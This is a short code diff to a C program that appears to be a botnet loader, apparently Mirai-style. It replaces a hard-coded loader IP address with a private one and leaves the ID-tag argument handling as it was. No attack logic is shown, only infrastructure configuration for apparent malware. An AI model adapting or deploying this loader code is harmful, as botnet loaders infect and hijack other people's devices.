@@ -150,7 +150,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("16.170.242.95"); // IP privee of the loader
+    addrs[0] = inet_addr("172.31.46.169"); // IP privee of the loader
 
     if (argc == 2)
         id_tag = args[1];
